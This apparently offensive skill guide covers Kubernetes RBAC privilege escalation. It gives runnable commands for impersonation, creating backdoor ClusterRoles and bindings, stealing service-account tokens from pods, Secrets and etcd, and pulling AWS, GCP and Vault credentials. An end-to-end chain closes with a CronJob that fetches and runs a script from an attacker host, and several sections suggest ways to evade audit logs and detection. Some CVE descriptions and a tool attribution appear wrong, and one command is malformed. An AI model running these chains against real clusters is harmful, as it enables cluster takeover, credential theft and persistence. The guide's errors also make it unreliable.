---
title: Kubernetes Attack — RBAC Privilege Escalation Deep Dive
skill: kubernetes-attack
domain: cloud-native-security
type: privilege-escalation
last-reviewed: 2026-06-30
---

# Kubernetes Attack — RBAC Privilege Escalation Deep Dive

## Overview

Kubernetes RBAC is the system's primary authorization layer. Despite its apparent simplicity (Role, RoleBinding, ClusterRole, ClusterRoleBinding), the RBAC model includes several high-impact escalation verbs that defenders frequently overlook: `impersonate`, `escalate`, and `bind`. Combined with service-account token theft, projected tokens, and the TokenRequest API, the privilege-escalation surface in modern k8s is substantial. This guide walks through each escalation primitive with hands-on reproduction steps, real CVEs (CVE-2022-3162, CVE-2022-3294, CVE-2023-2727, CVE-2023-2878), and detection/evasion considerations.

The escalation taxonomy covered here:

1. **Impersonation** (`impersonate` verb) — bypass authentication by acting as another user.
2. **Self-escalation** (`escalate` verb) — grant yourself permissions you don't already have.
3. **Binding abuse** (`bind` verb) — bind yourself to a high-privilege ClusterRole.
4. **Service-account token theft** — extract tokens from pods, secrets, projected volumes.
5. **TokenRequest API abuse** — mint short-lived tokens for arbitrary service accounts.
6. **Cloud IAM bridge abuse** — AWS IRSA, GCP Workload Identity, Azure AD Workload Identity.
7. **Pod identity sidecar injection** — abuse sidecars that inject cloud credentials.

Each primitive requires specific RBAC grants. The most dangerous finding in a k8s engagement is a service account with `escalate` or `bind` on clusterroles — that's a one-step cluster-admin.

## Step-by-Step Escalation Techniques

### Technique 1 — Impersonate Verb Abuse

The `impersonate` verb allows a user to act as another user, group, or service account. If a low-privilege SA has `impersonate` on `system:masters`, they can act as cluster-admin.

**Identifying the vulnerability**:

```bash
# Check what the current SA can impersonate
kubectl auth can-i --list | grep impersonate

# Common finding: a CI/CD service account with
#   impersonate users "*"
#   impersonate groups "*"
```

**Exploitation**:

```bash
# As the low-priv SA, impersonate a cluster-admin
kubectl --as=system:masters \
  --as-group=system:masters \
  get pods --all-namespaces

# Or impersonate a specific high-priv user
kubectl --as=admin@example.com \
  auth can-i --list
```

**Hidden gotcha**: Impersonation chains. If you can impersonate a user that can itself impersonate, you can pivot through multiple identities to evade audit attribution.

**Real-world relevance**: CVE-2022-3162 (VMware Tanzu) allowed impersonation bypass. The `impersonate` verb was historically over-granted in CI/CD pipelines that needed to deploy as different tenants.

**Detection**:
- Audit log `impersonatedUser` field. Alert on impersonation events.
- Falco rule on `kubectl --as` flag.
- OPA Gatekeeper policy forbidding `impersonate` grants to non-admin SAs.

**Evasion**:
- Impersonate a user whose audit log traffic is normally high.
- Use impersonation only at specific moments (e.g., during a known deploy window).

### Technique 2 — Escalate Verb Abuse

The `escalate` verb on `roles`/`clusterroles` allows a user to create or update a Role with permissions they don't have. This is a deliberate escape hatch in RBAC, intended for break-glass scenarios.

**Identifying**:

```bash
# Check for escalate permission
kubectl auth can-i escalate roles
kubectl auth can-i escalate clusterroles
# "yes" = finding
```

**Exploitation**:

```bash
# Create a ClusterRole that grants cluster-admin
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: backdoor-cluster-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

# Bind it to your SA
kubectl create clusterrolebinding backdoor-binding \
  --clusterrole=backdoor-cluster-admin \
  --serviceaccount=default:attacker

# You now have cluster-admin
kubectl auth can-i --list
```

**Why this works**: The `escalate` verb bypasses the standard RBAC check that prevents creating Roles with permissions the creator doesn't have. It's documented but frequently mis-granted.

**Real-world relevance**: The `escalate` verb is the single highest-impact RBAC misconfiguration. NSA k8s hardening guide specifically calls out auditing for it.

**Detection**:
- Audit log flag on `create clusterrole` with broad permissions.
- Kyverno policy requiring a label on any ClusterRole with `verbs: ["*"]`.
- Periodic review: `kubectl get clusterrole -o json | jq '.items[] | select(.rules[]?.verbs[]? == "*")'`.

### Technique 3 — Bind Verb Abuse

Similar to `escalate`, the `bind` verb on roles/clusterroles allows binding a Role you couldn't otherwise bind. Combined with a pre-existing privileged ClusterRole (e.g., `cluster-admin`), `bind` lets you attach yourself to it.

**Identifying**:

```bash
kubectl auth can-i bind roles
kubectl auth can-i bind clusterroles
```

**Exploitation**:

```bash
# Bind the existing cluster-admin ClusterRole to your SA
# (cluster-admin is a built-in ClusterRole — always present)
kubectl create clusterrolebinding attacker-cluster-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:attacker
```

**Variation — bind to system:masters**:
The `system:masters` group is hard-coded as cluster-admin in many configurations. If you can bind a user to `system:masters`, you have cluster-admin.

```bash
# Some clusters allow RoleBindings to system groups
kubectl create rolebinding master-binding \
  --clusterrole=cluster-admin \
  --group=system:masters \
  --user=attacker
```

**Real-world relevance**: CVE-2023-2727 (Kyverno) and similar admission controller CVEs effectively granted `bind` to certain service accounts.

### Technique 4 — Service Account Token Theft

Each pod has a service-account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Stealing this token gives the attacker the SA's permissions.

**Vector A — Token from compromised pod**:

```bash
# Inside a compromised pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# This JWT is the SA's identity

# Decode to see what SA we have
cat /var/run/secrets/kubernetes.io/serviceaccount/token | \
  awk -F. '{print $2}' | base64 -d 2>/dev/null | jq .
```

**Vector B — Token from k8s Secret (legacy)**:
Pre-1.24 k8s created long-lived tokens as Secret objects.

```bash
# If you have secrets.read, enumerate SA tokens
kubectl get secrets --all-namespaces -o json | \
  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | 
         "\(.metadata.namespace)/\(.metadata.name)"'

# Extract a token
kubectl get secret <sa-token-secret> -o jsonpath='{.data.token}' | base64 -d
```

**Vector C — Token from etcd**:
If the attacker can read etcd directly (e.g., via a compromised etcd pod), they get all tokens.

```bash
# Inside the etcd container
ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/etcd/ca.crt \
  --key=/etc/etcd/peer.key \
  --cert=/etc/etcd/peer.crt \
  get /secrets/default/sa-token --print-value-only | jq -r .data.token | base64 -d
```

**Defender countermeasures**:
- k8s 1.24+ uses short-lived projected tokens (no Secret). Use TokenRequest API.
- etcd encryption at rest (encrypts Secret data).
- NetworkPolicy preventing pod-to-etcd traffic.

### Technique 5 — Projected Tokens and TokenRequest API Abuse

Projected tokens (k8s 1.20+) are mounted via a `ProjectedServiceAccountToken` volume. The TokenRequest API allows minting short-lived tokens for arbitrary SAs.

**Vector A — Projected token abuse**:
Projected tokens have an audience and expiration. If the audience is too broad, the token can be reused across services.

```yaml
# Vulnerable pod spec — broad audience
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: app
    volumeMounts:
    - name: token
      mountPath: /var/run/secrets/tokens
  volumes:
  - name: token
    projected:
      sources:
      - serviceAccountToken:
          audience: ""  # ← empty = any audience
          expirationSeconds: 3600
          path: token
```

**Vector B — TokenRequest API abuse**:
If a SA has `create` on `serviceaccounts/token`, they can mint tokens for any SA.

```bash
# Identify the capability
kubectl auth can-i create serviceaccounts/token
# "yes" = finding

# Mint a token for the cluster-admin SA
kubectl create token cluster-admin-sa --duration=1h
```

**Variation — bound tokens**:
`kubectl create token --bound-object-kind=Pod` creates a token bound to a specific pod. Useful for evading detection that looks for SA tokens.

```bash
kubectl create token default \
  --bound-object-kind=Pod \
  --bound-object-name=legitimate-app-xyz
```

**Real-world relevance**: CVE-2023-2878 (k8s TokenRequest) and CVE-2022-3294 (kubelet log disclosure) both relate to token handling.

**Detection**:
- Audit log on `create token` (TokenRequest API). Alert on tokens with long durations or unusual audiences.
- Falco on `kubectl create token`.
- Periodic review of `serviceaccounts/token` grants.

### Technique 6 — AWS IRSA / GCP Workload Identity Abuse

Cloud IAM bridges (IRSA in AWS, Workload Identity in GCP, Workload Identity in Azure) link k8s SAs to cloud IAM roles. Abusing the bridge escalates from k8s to cloud.

**AWS IRSA**:

```bash
# Identify IRSA-configured SAs
kubectl get sa -A -o json | \
  jq -r '.items[] | select(.metadata.annotations."eks.amazonaws.com/role-arn") | 
         "\(.metadata.namespace)/\(.metadata.name) → \(.metadata.annotations."eks.amazonaws.com/role-arn")"''

# From a pod using that SA, assume the IAM role
# (IRSA injects env vars pointing to a token)
env | grep AWS_
# AWS_ROLE_ARN=arn:aws:iam::xxx:role/priv-role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Use the web identity to get AWS creds
aws sts assume-role-with-web-identity \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name attacker \
  --web-identity-token $(cat $AWS_WEB_IDENTITY_TOKEN_FILE)
```

**GCP Workload Identity**:

```bash
# Identify Workload Identity SAs
kubectl get sa -A -o json | \
  jq -r '.items[] | select(.metadata.annotations."iam.gke.io/gcp-service-account")'

# Inside the pod, the GCP SA is auto-usable
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Escalation pattern**:
1. Identify an SA with a broad IAM role attached.
2. Compromise a pod using that SA.
3. Use the cloud creds to escalate within the cloud (e.g., create new IAM users).

**Defender countermeasures**:
- Least-privilege IAM roles. Avoid `*` permissions.
- Use IRSA / Workload Identity audiences scoped to the SA.
- Audit: list all IRSA-enabled SAs and their IAM role policies.

### Technique 7 — Pod Identity Sidecar Injection

Some service meshes and identity brokers use sidecars that inject cloud credentials into pods. Compromising the sidecar gives cloud access.

**Vector A — AWS EKS Pod Identity Agent**:
The EKS Pod Identity Agent sidecar injects AWS creds. If the sidecar is reachable, an attacker can request creds.

```bash
# EKS Pod Identity Agent listens on localhost:80
# Inside a pod with the agent sidecar
curl http://localhost:80/credentials
# Returns AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
```

**Vector B — HashiCorp Vault Agent sidecar**:
Vault Agent sidecars retrieve secrets from Vault. Compromising the sidecar's Vault token gives access to all secrets.

```bash
# Vault Agent typically writes secrets to a shared volume
ls /vault/secrets/
cat /vault/secrets/db-creds

# Or hit the Vault Agent API
curl http://localhost:8200/v1/secret/data/path
```

**Vector C — Istio / Consul Connect sidecars**:
mTLS sidecars have access to service-to-service traffic. Compromising the sidecar enables traffic capture.

```bash
# Inside the istio-proxy sidecar
# Capture mTLS traffic to other services
istioctl proxy-config listeners <pod>.<namespace>
tcpdump -i lo -w captured.pcap
```

**Defender countermeasures**:
- NetworkPolicy restricting sidecar-to-cloud traffic.
- Audit Vault token usage; alert on unusual secret access patterns.
- Service mesh mTLS with SPIFFE/SPIRE for cryptographically verifiable identity.

## Hands-on: End-to-End Escalation Chain

Combining multiple techniques into a full chain:

```bash
# Step 1: Start with a low-priv SA in a CI/CD namespace
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN auth can-i --list

# Step 2: Identify impersonate permission (Technique 1)
kubectl --token=$TOKEN auth can-i impersonate users
# yes — pivot to admin
kubectl --token=$TOKEN --as=system:admin auth can-i escalate clusterroles
# yes

# Step 3: Escalate to cluster-admin (Technique 2)
kubectl --token=$TOKEN --as=system:admin apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: {name: ca-backdoor}
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

kubectl --token=$TOKEN --as=system:admin create clusterrolebinding ca-backdoor-b \
  --clusterrole=ca-backdoor --serviceaccount=default:attacker

# Step 4: Now you have cluster-admin as your original SA
kubectl --token=$TOKEN auth can-i '*' '*'
# yes

# Step 5: Pivot to cloud via IRSA (Technique 6)
kubectl --token=$TOKEN get sa -A -o json | \
  jq -r '.items[] | select(.metadata.annotations."eks.amazonaws.com/role-arn")'

# Step 6: Use the IRSA SA in a new pod
kubectl --token=$TOKEN run cloud-pivot \
  --serviceaccount=privileged-sa \
  --image=amazon/aws-cli \
  --restart=Never \
  -- aws s3 ls

# Step 7: Establish persistence via a CronJob (continues from cloud creds)
kubectl --token=$TOKEN create cronjob persistence \
  --image=alpine --schedule='*/15 * * * *' \
  -- /bin/sh -c 'curl http://attacker.example/x|sh'
```

**Counter-detection**:
- Audit log captures every impersonation event — alert on `impersonatedUser` field.
- Kyverno policy preventing ClusterRoleBindings to SAs outside approved namespaces.
- Falco rule on `kubectl create token`.
- Egress NetworkPolicy preventing cloud metadata access from non-trusted SAs.

## Detection Trade-offs

| Technique | Detection | Evasion |
|-----------|-----------|---------|
| Impersonate | Audit log impersonatedUser field | Impersonate during deploy window |
| Escalate | Alert on create clusterrole with `*` verbs | Create incrementally (multiple Roles) |
| Bind | Alert on clusterrolebinding to cluster-admin | Bind to a non-admin ClusterRole that's still high-priv |
| Token theft | k8s 1.24+ short-lived tokens | Steal token from Secret (legacy clusters) |
| TokenRequest | Audit log on create token | Use short durations to look like CI/CD |
| IRSA abuse | Cloud trail on assumeRole-with-web-identity | Match role session name to CI/CD patterns |
| Sidecar injection | NetworkPolicy on sidecar | Sidecar traffic looks like app traffic |

## References

1. Kubernetes RBAC documentation: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
2. Kubernetes Impersonation documentation: https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation
3. Kubernetes TokenRequest API: https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/
4. Projected Service Account Tokens: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#serviceaccount-token-volume-projection
5. AWS IRSA documentation: https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html
6. GCP Workload Identity: https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity
7. Azure AD Workload Identity: https://azure.github.io/azure-workload-identity/
8. NSA Kubernetes Hardening Guide (2022): https://media.defense.gov/2022/Aug/29/2003063800/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
9. CISA Kubernetes Security Guidance: https://www.cisa.gov/resources-tools/resources/kubernetes-security-guidance
10. Kubernetes Security Audit (CNCF): https://github.com/kubernetes/sig-security-docs
11. CVE-2022-3162 — VMware Tanzu impersonation bypass: https://nvd.nist.gov/vuln/detail/CVE-2022-3162
12. CVE-2022-3294 — Kubernetes kubelet log disclosure: https://nvd.nist.gov/vuln/detail/CVE-2022-3294
13. CVE-2023-2727 — Kyverno bypass: https://nvd.nist.gov/vuln/detail/CVE-2023-2727
14. CVE-2023-2878 — Kubernetes TokenRequest handling: https://nvd.nist.gov/vuln/detail/CVE-2023-2878
15. CVE-2024-21626 — runc container escape (relevant to SA theft): https://nvd.nist.gov/vuln/detail/CVE-2024-21626
16. rbac-lookup — Tool for RBAC auditing: https://github.com/FairwindsOps/rbac-lookup
17. audit2rbac — Generate RBAC from audit logs: https://github.com/rix0rrr/audit2rbac
18. MITRE ATT&CK — Privilege Escalation in containers: https://attack.mitre.org/tactics/TA0004/
